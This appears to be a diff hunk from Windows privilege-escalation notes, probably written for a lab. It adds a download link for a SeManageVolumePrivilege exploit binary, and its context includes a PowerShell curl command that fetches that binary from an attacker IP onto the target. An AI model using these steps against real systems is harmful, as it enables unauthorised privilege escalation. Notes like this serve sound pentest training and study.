@@ -292,6 +292,8 @@ whoami /priv
 # SeManageVolumePrivilege
 ```
 
+https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public / SeaManageVolumeExploit.exe download
+
 Exploit:
 ```powershell
 curl 10.10.14.8/SeManageVolumeExploit.exe -O ...
